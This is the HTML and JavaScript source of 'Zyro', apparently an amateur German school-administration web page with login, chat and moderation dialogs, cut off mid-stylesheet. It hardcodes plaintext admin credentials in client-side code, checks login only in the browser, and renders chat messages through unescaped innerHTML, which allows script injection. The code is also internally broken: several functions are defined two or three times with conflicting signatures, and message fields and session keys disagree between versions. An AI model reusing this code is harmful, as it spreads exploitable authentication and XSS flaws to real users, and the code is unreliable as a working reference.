<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zyro - Modernes Schulverwaltungssystem</title>
    
    <script>
        // Vordefinierte Benutzer für Login
        const users = [
        {
            username: 'zyro',
            password: 'zyro',
            role: 'admin',
            status: 'offline',
            lastActive: new Date().toISOString()
        },
        {
            username: 'zyr0',
            password: 'zyr0',
            role: 'user',
            status: 'offline',
            lastActive: new Date().toISOString()
        }
    ];

    // Chat-System initialisieren
    const chatMessages = JSON.parse(localStorage.getItem('chatMessages') || '[]');
    
    function updateUserStatus(username, status) {
        const user = users.find(u => u.username === username);
        if (user) {
            user.status = status;
            user.lastActive = new Date().toISOString();
        }
    }

    function createChatUI() {
        // Chat-Container erstellen
        const chatContainer = document.createElement('div');
        chatContainer.id = 'chat-container';
        chatContainer.style.cssText = `
            position: fixed;
            bottom: 0;
            right: 20px;
            width: 300px;
            height: 400px;
            background: white;
            border-radius: 10px 10px 0 0;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            z-index: 1000;
        `;

        // Chat-Header
        const header = document.createElement('div');
        header.style.cssText = `
            padding: 10px;
            background: var(--primary-600);
            color: white;
            border-radius: 10px 10px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        `;
        header.innerHTML = '<span>Chat</span><button id="minimize-chat" style="background: none; border: none; color: white; cursor: pointer;">−</button>';
        chatContainer.appendChild(header);

        // Benutzerliste
        const userList = document.createElement('div');
        userList.id = 'user-list';
        userList.style.cssText = `
            height: 100px;
            overflow-y: auto;
            border-bottom: 1px solid #eee;
            padding: 10px;
        `;
        chatContainer.appendChild(userList);

        // Chat-Nachrichten
        const messages = document.createElement('div');
        messages.id = 'chat-messages';
        messages.style.cssText = `
            flex-grow: 1;
            overflow-y: auto;
            padding: 10px;
        `;
        chatContainer.appendChild(messages);

        // Nachrichteneingabe
        const input = document.createElement('div');
        input.style.cssText = `
            padding: 10px;
            border-top: 1px solid #eee;
            display: flex;
        `;
        input.innerHTML = `
            <input type="text" id="message-input" placeholder="Nachricht eingeben..." style="flex-grow: 1; margin-right: 10px; padding: 5px;">
            <button onclick="sendMessage()" style="background: var(--primary-600); color: white; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer;">Senden</button>
        `;
        chatContainer.appendChild(input);

        document.body.appendChild(chatContainer);

        // Event-Listener
        document.getElementById('minimize-chat').addEventListener('click', function() {
            const container = document.getElementById('chat-container');
            if (container.style.height === '400px') {
                container.style.height = '40px';
                messages.style.display = 'none';
                userList.style.display = 'none';
                input.style.display = 'none';
                this.textContent = '+';
            } else {
                container.style.height = '400px';
                messages.style.display = 'block';
                userList.style.display = 'block';
                input.style.display = 'flex';
                this.textContent = '−';
            }
        });

        // Chat initialisieren
        updateUserList();
        loadMessages();
    }

    function updateUserList() {
        const userList = document.getElementById('user-list');
        if (!userList) return;

        userList.innerHTML = '';
        users.forEach(user => {
            const userElement = document.createElement('div');
            userElement.style.cssText = `
                display: flex;
                align-items: center;
                margin-bottom: 5px;
                cursor: pointer;
                padding: 5px;
                border-radius: 5px;
            `;
            userElement.addEventListener('click', () => showUserProfile(user.username));
            
            const statusColor = user.status === 'online' ? '#4CAF50' : '#9e9e9e';
            userElement.innerHTML = `
                <span style="width: 8px; height: 8px; background: ${statusColor}; border-radius: 50%; margin-right: 5px;"></span>
                <span>${user.username} (${user.role})</span>
            `;
            userList.appendChild(userElement);
        });
    }

    function showUserProfile(username) {
    // Bestehende Profile entfernen
    const existingProfile = document.getElementById('user-profile');
    if (existingProfile) {
        existingProfile.remove();
    }

    const user = users.find(u => u.username === username);
    if (!user) return;

    const profileCard = document.createElement('div');
    profileCard.id = 'user-profile';
    profileCard.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 20px rgba(0,0,0,0.2);
        z-index: 1001;
        width: 300px;
        text-align: center;
    `;

    const closeButton = document.createElement('button');
    closeButton.innerHTML = '×';
    closeButton.style.cssText = `
        position: absolute;
        top: 10px;
        right: 10px;
        border: none;
        background: none;
        font-size: 20px;
        cursor: pointer;
        color: #666;
    `;
    closeButton.onclick = () => profileCard.remove();

    // Ban Dialog
    function showBanDialog(username) {
        const dialog = createDialog('Benutzer bannen');
        
        dialog.setContent(`
            <p>Möchten Sie ${username} bannen?</p>
            <div style="margin-bottom: 15px;">
                <label for="ban-reason">Grund:</label>
                <textarea id="ban-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
            </div>
            <div>
                <label for="ban-duration">Dauer:</label>
                <select id="ban-duration" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
                    <option value="1">1 Tag</option>
                    <option value="3">3 Tage</option>
                    <option value="7">1 Woche</option>
                    <option value="30">1 Monat</option>
                    <option value="permanent">Permanent</option>
                </select>
            </div>
        `);
        
        dialog.addButton('Bannen', () => {
            const reason = document.getElementById('ban-reason').value;
            const duration = document.getElementById('ban-duration').value;
            banUser(username, reason, duration);
            dialog.close();
        });
        
        dialog.show();
    }

    // Kick Dialog
    function showKickDialog(username) {
        const dialog = createDialog('Benutzer kicken');
        
        dialog.setContent(`
            <p>Möchten Sie ${username} kicken?</p>
            <div style="margin-bottom: 15px;">
                <label for="kick-reason">Grund:</label>
                <textarea id="kick-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
            </div>
        `);
        
        dialog.addButton('Kicken', () => {
            const reason = document.getElementById('kick-reason').value;
            kickUser(username, reason);
            dialog.close();
        });
        
        dialog.show();
    }

    // Announcement Dialog
    function showAnnouncementDialog(username) {
        const dialog = createDialog('Ankündigung senden');
        
        dialog.setContent(`
            <p>Ankündigung an ${username} senden:</p>
            <div style="margin-bottom: 15px;">
                <label for="announcement-text">Nachricht:</label>
                <textarea id="announcement-text" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
            </div>
            <div>
                <label for="announcement-type">Typ:</label>
                <select id="announcement-type" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
                    <option value="info">Information</option>
                    <option value="warning">Warnung</option>
                    <option value="important">Wichtig</option>
                </select>
            </div>
        `);
        
        dialog.addButton('Senden', () => {
            const text = document.getElementById('announcement-text').value;
            const type = document.getElementById('announcement-type').value;
            showAnnouncement(type, text);
            dialog.close();
        });
        
        dialog.show();
    }

            const avatar = document.createElement('div');
    avatar.style.cssText = `
        width: 80px;
        height: 80px;
        background: var(--primary-100);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 36px;
        color: var(--primary-600);
        margin: 0 auto 20px;
    `;
    avatar.textContent = (user.username[0] || '').toUpperCase();

    const actionContainer = document.createElement('div');
    actionContainer.style.cssText = `
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
        margin-top: 20px;
    `;

    // Ban Button
    const actionBanButton = document.createElement('button');
    actionBanButton.textContent = 'Bann';
    actionBanButton.style.cssText = `
        background: #dc3545;
        color: white;
        border: none;
        padding: 8px;
        border-radius: 5px;
        cursor: pointer;
    `;
    actionBanButton.onclick = () => showBanDialog(user.username);

    // Kick Button
    const actionKickButton = document.createElement('button');
    actionKickButton.textContent = 'Kick';
    actionKickButton.style.cssText = `
        background: #ffc107;
        color: black;
        border: none;
        padding: 8px;
        border-radius: 5px;
        cursor: pointer;
    `;
    actionKickButton.onclick = () => showKickDialog(user.username);

    // Announcement Button
    const actionAnnounceButton = document.createElement('button');
    actionAnnounceButton.textContent = 'Ankündigung';
    actionAnnounceButton.style.cssText = `
        background: #0d6efd;
        color: white;
        border: none;
        padding: 8px;
        border-radius: 5px;
        cursor: pointer;
    `;
    actionAnnounceButton.onclick = () => showAnnouncementDialog(user.username);

    // Info Button
    const actionInfoButton = document.createElement('button');
    actionInfoButton.textContent = 'Infos';
    actionInfoButton.style.cssText = `
        background: #198754;
        color: white;
        border: none;
        padding: 8px;
        border-radius: 5px;
        cursor: pointer;
    `;
    actionInfoButton.onclick = () => {
        const dialog = createDialog('Benutzerinformationen');
        dialog.setContent(`
            <div style="text-align: left;">
                <p><strong>Benutzername:</strong> ${user.username}</p>
                <p><strong>Rolle:</strong> ${user.role || 'Benutzer'}</p>
                <p><strong>Status:</strong> ${user.status || 'Offline'}</p>
                <p><strong>Letzte Aktivität:</strong> ${new Date(user.lastActive).toLocaleString()}</p>
            </div>
        `);
        dialog.addButton('Schließen', () => dialog.close());
        dialog.show();
    };

    actionContainer.append(actionBanButton, actionKickButton, actionAnnounceButton, actionInfoButton);

        const username_display = document.createElement('h3');
        username_display.style.marginBottom = '20px';
        username_display.textContent = user.username;

        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 20px;
        `;

        // Ban Button
        const banButton = document.createElement('button');
        banButton.textContent = 'Bann';
        banButton.style.cssText = `
            background: #dc3545;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 5px;
            cursor: pointer;
        `;
        banButton.onclick = () => showBanDialog(user);

        // Kick Button
        const kickButton = document.createElement('button');
        kickButton.textContent = 'Kick';
        kickButton.style.cssText = `
            background: #ffc107;
            color: black;
            border: none;
            padding: 8px;
            border-radius: 5px;
            cursor: pointer;
        `;
        kickButton.onclick = () => showKickDialog(user);

        // Announcement Button
        const announceButton = document.createElement('button');
        announceButton.textContent = 'Ankündigung';
        announceButton.style.cssText = `
            background: #0d6efd;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 5px;
            cursor: pointer;
        `;
        announceButton.onclick = () => showAnnouncementDialog(user);

        // Info Button
        const infoButton = document.createElement('button');
        infoButton.textContent = 'Infos';
        infoButton.style.cssText = `
            background: #198754;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 5px;
            cursor: pointer;
        `;
        infoButton.onclick = () => showUserInfo(user);

        buttonContainer.append(banButton, kickButton, announceButton, infoButton);
        profileCard.append(closeButton, avatar, username_display, buttonContainer);
        document.body.appendChild(profileCard);
    }

    // Ban Dialog
    function showBanDialog(user) {
        const dialog = createDialog('Benutzer bannen');
        
        const content = document.createElement('div');
        content.innerHTML = `
            <p>Möchten Sie ${user.username} bannen?</p>
            <div class="form-group" style="margin-bottom: 15px;">
                <label for="ban-reason">Grund:</label>
                <textarea id="ban-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
            </div>
            <div class="form-group">
                <label for="ban-duration">Dauer:</label>
                <select id="ban-duration" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
                    <option value="1">1 Tag</option>
                    <option value="3">3 Tage</option>
                    <option value="7">1 Woche</option>
                    <option value="30">1 Monat</option>
                    <option value="permanent">Permanent</option>
                </select>
            </div>
        `;
        
        dialog.setContent(content.innerHTML);
        dialog.addButton('Bannen', () => {
            const reason = document.getElementById('ban-reason').value;
            const duration = document.getElementById('ban-duration').value;
            
            // Ban-Logik implementieren
            const bannedUsers = JSON.parse(localStorage.getItem('bannedUsers') || '[]');
            const banInfo = {
                username: user.username,
                reason: reason,
                duration: duration,
                bannedAt: new Date().toISOString(),
                bannedBy: JSON.parse(localStorage.getItem('zyroUser'))?.username
            };
            bannedUsers.push(banInfo);
            localStorage.setItem('bannedUsers', JSON.stringify(bannedUsers));
            
            // Benutzer über den Ban informieren
            alert(`${user.username} wurde für ${duration === 'permanent' ? 'permanent' : duration + ' Tage'} gebannt.`);
            dialog.close();
            document.getElementById('user-profile')?.remove();
        });
        dialog.show();
    }

    // Kick Dialog
    function showKickDialog(user) {
        const dialog = createDialog('Benutzer kicken');
        
        const content = document.createElement('div');
        content.innerHTML = `
            <p>Möchten Sie ${user.username} kicken?</p>
            <div class="form-group" style="margin-bottom: 15px;">
                <label for="kick-reason">Grund:</label>
                <textarea id="kick-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
            </div>
        `;
        
        dialog.setContent(content.innerHTML);
        dialog.addButton('Kicken', () => {
            const reason = document.getElementById('kick-reason').value;
            
            // Kick-Logik implementieren
            const kickedUsers = JSON.parse(localStorage.getItem('kickedUsers') || '[]');
            const kickInfo = {
                username: user.username,
                reason: reason,
                kickedAt: new Date().toISOString(),
                kickedBy: JSON.parse(localStorage.getItem('zyroUser'))?.username
            };
            kickedUsers.push(kickInfo);
            localStorage.setItem('kickedUsers', JSON.stringify(kickedUsers));
            
            // Benutzer über den Kick informieren
            alert(`${user.username} wurde gekickt.`);
            dialog.close();
            document.getElementById('user-profile')?.remove();
        });
        dialog.show();
    }

    // Announcement Dialog
    function showAnnouncementDialog(user) {
        const dialog = createDialog('Ankündigung senden');
        
        const content = document.createElement('div');
        content.innerHTML = `
            <p>Ankündigung an ${user.username} senden:</p>
            <div class="form-group" style="margin-bottom: 15px;">
                <label for="announcement-message">Nachricht:</label>
                <textarea id="announcement-message" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
            </div>
            <div class="form-group">
                <label for="announcement-type">Typ:</label>
                <select id="announcement-type" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
                    <option value="info">Information</option>
                    <option value="warning">Warnung</option>
                    <option value="important">Wichtig</option>
                </select>
            </div>
        `;
        
        dialog.setContent(content.innerHTML);
        dialog.addButton('Senden', () => {
            const message = document.getElementById('announcement-message').value;
            const type = document.getElementById('announcement-type').value;
            
            // Ankündigungs-Logik implementieren
            const announcements = JSON.parse(localStorage.getItem('announcements') || '[]');
            const announcementInfo = {
                username: user.username,
                message: message,
                type: type,
                sentAt: new Date().toISOString(),
                sentBy: JSON.parse(localStorage.getItem('zyroUser'))?.username
            };
            announcements.push(announcementInfo);
            localStorage.setItem('announcements', JSON.stringify(announcements));
            
            // Benutzer über die Ankündigung informieren
            alert(`Ankündigung wurde an ${user.username} gesendet.`);
            dialog.close();
            document.getElementById('user-profile')?.remove();
        });
        dialog.show();
    }

    // User Info Dialog
    function showUserInfo(user) {
        const dialog = createDialog('Benutzerinformationen');
        
        const content = document.createElement('div');
        content.innerHTML = `
            <div style="text-align: left;">
                <p><strong>Benutzername:</strong> ${user.username}</p>
                <p><strong>Rolle:</strong> ${user.role || 'Benutzer'}</p>
                <p><strong>Status:</strong> ${user.status || 'Offline'}</p>
                <p><strong>Letzte Aktivität:</strong> ${new Date().toLocaleString()}</p>
                <p><strong>Registriert seit:</strong> ${new Date().toLocaleDateString()}</p>
            </div>
        `;
        
        dialog.setContent(content.innerHTML);
        dialog.addButton('Schließen', () => {
            dialog.close();
        });
        dialog.show();
    }

    function createDialog(title) {
        const dialog = document.createElement('div');
        dialog.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            z-index: 1002;
            width: 400px;
        `;

        const titleElement = document.createElement('h3');
        titleElement.style.marginTop = '0';
        titleElement.textContent = title;

        const contentContainer = document.createElement('div');
        contentContainer.style.marginBottom = '20px';

        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        `;

        dialog.append(titleElement, contentContainer, buttonContainer);

        return {
            setContent: (content) => {
                contentContainer.innerHTML = content;
            },
            addButton: (text, onClick) => {
                const button = document.createElement('button');
                button.textContent = text;
                button.style.cssText = `
                    background: var(--primary-600);
                    color: white;
                    border: none;
                    padding: 8px 15px;
                    border-radius: 5px;
                    cursor: pointer;
                `;
                button.onclick = onClick;
                buttonContainer.appendChild(button);

                // Abbrechen-Button hinzufügen
                if (text !== 'Abbrechen' && text !== 'Schließen') {
                    const cancelButton = document.createElement('button');
                    cancelButton.textContent = 'Abbrechen';
                    cancelButton.style.cssText = `
                        background: var(--gray-400);
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                    `;
                    cancelButton.onclick = () => dialog.remove();
                    buttonContainer.insertBefore(cancelButton, button);
                }
            },
            show: () => document.body.appendChild(dialog),
            close: () => dialog.remove()
        };
    }

    function checkLogin(username, password) {
        return users.find(u => u.username === username && u.password === password);
    }

    function login() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const user = checkLogin(username, password);

        if (user) {
            localStorage.setItem('zyroUser', JSON.stringify(user));
            updateUserStatus(username, 'online');
            updateUserInterface(user);
            createChatUI();
            window.location.href = user.role === 'admin' ? 'admin.html' : 'user.html';
        } else {
            document.getElementById('error').textContent = 'Ungültige Anmeldedaten';
        }
    }

    function updateUserInterface(user) {
        const userDisplay = document.getElementById('user-display');
        userDisplay.textContent = user.username;
        userDisplay.style.display = 'inline-block';

        const initial = document.getElementById('user-initial');
        initial.textContent = user.username[0].toUpperCase();
        initial.style.display = 'inline-block';
    }

    function logout() {
        const user = JSON.parse(localStorage.getItem('zyroUser'));
        if (user) {
            updateUserStatus(user.username, 'offline');
            localStorage.removeItem('zyroUser');
            window.location.href = 'index.html';
        }
    }

    function showSocialMediaPage() {
        window.location.href = 'social_media.html';
    }

    function showMensaPage() {
        window.location.href = 'mensa.html';
    }

    function showCookieNotice() {
        const cookieNotice = document.getElementById('cookie-notice');
        cookieNotice.style.display = 'block';
    }

    function acceptCookies() {
        const cookieNotice = document.getElementById('cookie-notice');
        cookieNotice.style.display = 'none';
    }

    function getPosition() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            } else {
                reject('Geolocation is not supported by this browser.');
            }
        });
    }

    function sendMessage() {
        const input = document.getElementById('message-input');
        const message = input.value.trim();
        if (message) {
            const user = JSON.parse(localStorage.getItem('zyroUser'));
            if (user) {
                const newMessage = {
                    username: user.username,
                    message: message,
                    timestamp: new Date().toISOString()
                };
                chatMessages.push(newMessage);
                localStorage.setItem('chatMessages', JSON.stringify(chatMessages));
                input.value = '';
                updateChatMessages();
            }
        }
    }

    function updateChatMessages() {
        const messagesContainer = document.getElementById('chat-messages');
        messagesContainer.innerHTML = '';
        chatMessages.forEach(msg => {
            const messageElement = document.createElement('div');
            messageElement.style.cssText = `
                display: flex;
                align-items: center;
                margin-bottom: 10px;
            `;
            const isOwnMessage = JSON.parse(localStorage.getItem('zyroUser'))?.username === msg.username;
            messageElement.innerHTML = `
                <span style="font-weight: bold; margin-right: 5px;">${msg.username}:</span>
                <span>${msg.message}</span>
                <span style="font-size: 0.8em; color: #999; margin-left: 10px;">${new Date(msg.timestamp).toLocaleTimeString()}</span>
            `;
            if (isOwnMessage) {
                messageElement.style.justifyContent = 'flex-end';
            }
            messagesContainer.appendChild(messageElement);
        });
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }

    function loadMessages() {
        chatMessages.forEach(msg => {
            const messageElement = document.createElement('div');
            messageElement.style.cssText = `
                display: flex;
                align-items: center;
                margin-bottom: 10px;
            `;
            const isOwnMessage = JSON.parse(localStorage.getItem('zyroUser'))?.username === msg.username;
            messageElement.innerHTML = `
                <span style="font-weight: bold; margin-right: 5px;">${msg.username}:</span>
                <span>${msg.message}</span>
                <span style="font-size: 0.8em; color: #999; margin-left: 10px;">${new Date(msg.timestamp).toLocaleTimeString()}</span>
            `;
            if (isOwnMessage) {
                messageElement.style.justifyContent = 'flex-end';
            }
            document.getElementById('chat-messages').appendChild(messageElement);
        });
        document.getElementById('chat-messages').scrollTop = document.getElementById('chat-messages').scrollHeight;
    }

    function showAnnouncement(title, message) {
        const announcement = document.createElement('div');
        announcement.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: white;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            z-index: 1000;
            animation: slideIn 0.5s ease-in-out, fadeOut 0.5s 5s ease-in-out forwards;
        `;
        announcement.innerHTML = `
            <h4>${title}</h4>
            <p>${message}</p>
        `;
        document.body.appendChild(announcement);

        setTimeout(() => {
            announcement.remove();
        }, 5500);
    }

    function banUser(username, reason, duration) {
        const user = users.find(u => u.username === username);
        if (user) {
            user.status = 'banned';
            user.banReason = reason;
            user.banDuration = duration;
            user.banStart = new Date().toISOString();
            updateUserList();
            showAnnouncement('Bann', `${username} wurde für ${duration} gebannt. Grund: ${reason}`);
        }
    }

    function kickUser(username, reason) {
        const user = users.find(u => u.username === username);
        if (user) {
            user.status = 'offline';
            updateUserList();
            showAnnouncement('Kick', `${username} wurde gekickt. Grund: ${reason}`);
        }
    }

    function showAnnouncementDialog(username) {
        const dialog = createDialog('Ankündigung erstellen');
        const content = `
            <div style="margin-bottom: 15px;">
                <label>Nachricht:</label>
                <textarea id="announcement-text" style="width: 100%; height: 100px; margin-top: 5px; padding: 5px;"></textarea>
            </div>
        `;
        dialog.setContent(content);
        dialog.addButton('Ankündigen', () => {
            const text = document.getElementById('announcement-text').value;
            if (text) {
                showAnnouncement('Ankündigung', `${username}: ${text}`);
                dialog.close();
            }
        });
        dialog.show();
    }

    function createDialog(title) {
        const dialog = document.createElement('div');
        dialog.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            z-index: 1002;
            width: 300px;
        `;

        const titleElement = document.createElement('h3');
        titleElement.textContent = title;
        titleElement.style.marginBottom = '15px';

        const contentContainer = document.createElement('div');
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        `;

        dialog.append(titleElement, contentContainer, buttonContainer);

        return {
            setContent: (content) => {
                contentContainer.innerHTML = content;
            },
            addButton: (text, onClick) => {
                const button = document.createElement('button');
                button.textContent = text;
                button.style.cssText = `
                    background: var(--primary-600);
                    color: white;
                    border: none;
                    padding: 8px 15px;
                    border-radius: 5px;
                    cursor: pointer;
                `;
                button.onclick = onClick;
                buttonContainer.appendChild(button);

                const cancelButton = document.createElement('button');
                cancelButton.textContent = 'Abbrechen';
                cancelButton.style.cssText = `
                    background: var(--gray-400);
                    color: white;
                    border: none;
                    padding: 8px 15px;
                    border-radius: 5px;
                    cursor: pointer;
                `;
                cancelButton.onclick = () => dialog.remove();
                buttonContainer.insertBefore(cancelButton, button);
            },
            show: () => document.body.appendChild(dialog),
            close: () => dialog.remove()
        };
    }

    function loadMessages() {
        const messages = document.getElementById('chat-messages');
        if (!messages) return;

        messages.innerHTML = '';
        chatMessages.forEach(msg => {
            const messageElement = document.createElement('div');
            messageElement.style.cssText = `
                margin-bottom: 10px;
                ${msg.sender === getCurrentUser()?.username ? 'text-align: right;' : ''}
            `;
            messageElement.innerHTML = `
                <small style="color: #666;">${msg.sender}</small>
                <div style="background: ${msg.sender === getCurrentUser()?.username ? 'var(--primary-100)' : '#f5f5f5'}; 
                            padding: 5px 10px; 
                            border-radius: 10px; 
                            display: inline-block;
                            max-width: 80%;">
                    ${msg.text}
                </div>
                <small style="color: #999;">${new Date(msg.timestamp).toLocaleTimeString()}</small>
            `;
            messages.appendChild(messageElement);
        });
        messages.scrollTop = messages.scrollHeight;
    }

    function sendMessage() {
        const input = document.getElementById('message-input');
        const currentUser = getCurrentUser();
        
        if (!input || !currentUser || !input.value.trim()) return;

        const message = {
            sender: currentUser.username,
            text: input.value.trim(),
            timestamp: new Date().toISOString()
        };

        chatMessages.push(message);
        localStorage.setItem('chatMessages', JSON.stringify(chatMessages));
        
        input.value = '';
        loadMessages();
    }

    function getCurrentUser() {
        return JSON.parse(localStorage.getItem('currentUser'));
    }

    function logout() {
        const currentUser = getCurrentUser();
        if (currentUser) {
            updateUserStatus(currentUser.username, 'offline');
        }
        localStorage.removeItem("currentUser");
        window.location.href = "login.html";
    }

    function createDialog(title) {
        const dialog = document.createElement('div');
        dialog.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            z-index: 1002;
            width: 400px;
        `;

        const titleElement = document.createElement('h3');
        titleElement.style.marginTop = '0';
        titleElement.textContent = title;

        const contentContainer = document.createElement('div');
        contentContainer.style.marginBottom = '20px';

        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        `;

        dialog.append(titleElement, contentContainer, buttonContainer);

        return {
            setContent: (content) => {
                contentContainer.innerHTML = content;
            },
            addButton: (text, onClick) => {
                const button = document.createElement('button');
                button.textContent = text;
                button.style.cssText = `
                    background: var(--primary-600);
                    color: white;
                    border: none;
                    padding: 8px 15px;
                    border-radius: 5px;
                    cursor: pointer;
                `;
                button.onclick = onClick;
                buttonContainer.appendChild(button);

                // Abbrechen-Button hinzufügen
                if (text !== 'Abbrechen' && text !== 'Schließen') {
                    const cancelButton = document.createElement('button');
                    cancelButton.textContent = 'Abbrechen';
                    cancelButton.style.cssText = `
                        background: var(--gray-400);
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                    `;
                    cancelButton.onclick = () => dialog.remove();
                    buttonContainer.insertBefore(cancelButton, button);
                }
            },
            show: () => document.body.appendChild(dialog),
            close: () => dialog.remove()
        };
    }
</script>
<style>
    /* Tailwind-ähnliche Basisstile */
    :root {
        --primary-50: #eef2ff;
        --primary-100: #e0e7ff;
        --primary-200: #c7d2fe;
        --primary-300: #a5b4fc;
        --primary-400: #818cf8;
        --primary-500: #6366f1;
        --primary-600: #4f46e5;
        --primary-700: #4338ca;
        --primary-800: #3730a3;
        --primary-900: #312e81;
        --primary-950: #1e1b4b;
        
        --secondary-50: #f0fdfa;
        --secondary-100: #ccfbf1;
        --secondary-200: #99f6e4;
        --secondary-300: #5eead4;
        --secondary-400: #2dd4bf;
        --secondary-500: #14b8a6;
        --secondary-600: #0d9488;
        --secondary-700: #0f766e;
        --secondary-800: #115e59;
        --secondary-900: #134e4a;
        --secondary-950: #042f2e;
        
        --gray-50: #f9fafb;
        --gray-100: #f3f4f6;
        --gray-200: #e5e7eb;
        --gray-300: #d1d5db;
        --gray-400: #9ca3af;
        --gray-500: #6b7280;
        --gray-600: #4b5563;
        --gray-700: #374151;
        --gray-800: #1f2937;
        --gray-900: #111827;
        --gray-950: #030712;
        
        --foreground-rgb: 0, 0, 0;
        --background-rgb: 255, 255, 255;
    }

    /* Basis-Animationen */
    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    @keyframes slideIn {
        from { transform: translateY(20px); opacity: 0; }
        to { transform: translateY(0); opacity: 1; }
    }

    @keyframes scaleIn {
        from { transform: scale(0.95); opacity: 0; }
        to { transform: scale(1); opacity: 1; }
    }

    @keyframes bounce {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
    }

    @keyframes shimmer {
        0% { background-position: -1000px 0; }
        100% { background-position: 1000px 0; }
    }

    /* Globale Animationen */
    .card, .message-preview, .notification-item, .time-slot {
        animation: scaleIn 0.3s ease-out;
        transition: all 0.3s ease;
    }

    .card:hover, .message-preview:hover, .notification-item:hover, .time-slot:hover {
        transform: translateY(-4px);
        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
    }

    /* Button Animationen */
    .btn {
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .btn:hover {
        transform: translateY(-2px);
    }

    .btn:active {
        transform: translateY(1px);
    }

    /* Navigation Animationen */
    .nav-link {
        transition: all 0.3s ease;
        position: relative;
    }

    .nav-link::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 50%;
        width: 0;
        height: 2px;
        background: var(--primary-600);
        transition: all 0.3s ease;
    }

    .nav-link:hover::after {
        width: 100%;
        left: 0;
    }

    /* Modal Animationen */
    .modal {
        transition: opacity 0.3s ease;
    }

    .modal-content {
        animation: slideIn 0.3s ease-out;
    }

    /* Dropdown Animationen */
    .profile-dropdown, .notifications-dropdown {
        transform-origin: top right;
        transition: all 0.3s ease;
        transform: scale(0.95);
        opacity: 0;
        visibility: hidden;
    }

    .profile-dropdown.open, .notifications-dropdown.open {
        transform: scale(1);
        opacity: 1;
        visibility: visible;
    }

    /* Nachrichten Animationen */
    .message-preview.unread::before {
        content: '';
        position: absolute;
        left: 0;
        top: 50%;
        transform: translateY(-50%);
        width: 4px;
        height: 70%;
        background: var(--primary-600);
        border-radius: 2px;
        animation: scaleIn 0.3s ease-out;
    }

    /* Loading Spinner Animation */
    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .loading-spinner {
        animation: spin 1s linear infinite, bounce 2s ease infinite;
    }

    /* Page Transitions */
    .page-container {
        transition: all 0.3s ease;
        opacity: 0;
        transform: translateY(20px);
    }

    .page-container.active {
        opacity: 1;
        transform: translateY(0);
    }

    /* Social Media Cards */
    .social-card {
        transition: all 0.3s ease;
    }

    .social-card:hover {
        transform: translateY(-8px) rotate(2deg);
        box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
    }

    .social-icon {
        transition: all 0.3s ease;
    }

    .social-card:hover .social-icon {
        transform: scale(1.1) rotate(-5deg);
    }

    /* Form Inputs */
    input[type="text"],
    input[type="password"],
    input[type="email"],
    textarea {
        transition: all 0.3s ease;
    }

    input[type="text"]:focus,
